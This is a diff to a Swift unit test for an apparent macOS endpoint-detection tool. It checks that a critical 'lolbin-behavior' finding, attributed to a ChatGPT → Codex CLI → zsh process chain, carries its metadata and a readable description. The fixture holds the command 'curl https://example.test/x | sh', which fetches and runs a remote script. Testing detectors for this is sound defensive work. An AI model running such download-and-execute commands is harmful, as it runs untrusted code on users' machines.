@@ -20,7 +20,12 @@ final class ExtensionXPCClientIncidentTests: XCTestCase {
                     "detectionKind": "lolbin-behavior",
                     "signalSeverity": "critical",
                     "execTargetPath": "/bin/zsh",
-                    "matchedCommand": "curl https://example.test/x | sh"
+                    "matchedCommand": "curl https://example.test/x | sh",
+                    "responsibleAppName": "ChatGPT",
+                    "responsibleAppBundleID": "com.openai.chat",
+                    "responsibleAppTeamID": "2DC432GLL2",
+                    "responsibleAppSigning": "Signed",
+                    "responsibleChain": "ChatGPT → Codex CLI → zsh"
                 ]
             )
         )
@@ -33,6 +38,11 @@ final class ExtensionXPCClientIncidentTests: XCTestCase {
         )
         XCTAssertNil(finding.signal.fileInfo)
         XCTAssertEqual(finding.signal.metadata["matchedCommand"], "curl https://example.test/x | sh")
+        XCTAssertEqual(finding.signal.metadata["responsibleAppName"], "ChatGPT")
+        XCTAssertEqual(
+            finding.signal.description,
+            "Nick saw a shell run a script supplied by a download command."
+        )
     }
 #if DEBUG
     @MainActor
